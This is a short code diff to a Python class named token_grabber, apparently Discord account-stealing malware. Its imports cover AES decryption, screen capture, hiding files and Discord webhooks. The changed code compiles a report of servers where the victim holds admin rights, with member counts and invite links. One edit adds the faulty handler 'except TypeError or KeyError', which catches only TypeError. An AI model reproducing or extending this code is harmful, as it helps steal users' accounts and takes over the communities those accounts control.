@@ -15,7 +15,7 @@ import psutil
 import requests
 import wmi
 from Crypto.Cipher import AES
-from discord import RequestsWebhookAdapter, Embed, File, Webhook
+from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from PIL import ImageGrab
 from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
@@ -187,7 +187,8 @@ class token_grabber():
                             hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
                         else:
                             hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite code could be found for this guild\n"
-            except TypeError:
+            
+            except TypeError or KeyError:
                 pass            
                 
             
